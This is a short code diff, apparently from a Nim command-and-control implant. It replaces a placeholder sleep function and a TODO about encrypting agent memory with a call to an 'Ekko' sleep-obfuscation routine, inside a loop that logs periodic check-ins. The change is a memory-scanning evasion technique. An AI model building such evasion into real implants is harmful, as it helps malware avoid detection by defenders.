@@ -35,11 +35,7 @@ proc main() =
 
     while true: 
 
-        # TODO: Replace with actual sleep obfuscation that encrypts agent memory
-
-        sleepMask(ctx.sleep * 1000)
-
-        # sleep(ctx.sleep * 1000)
+        sleepEkko(ctx.sleep * 1000)
 
         let date: string = now().format("dd-MM-yyyy HH:mm:ss")
         echo fmt"[{date}] Checking in."
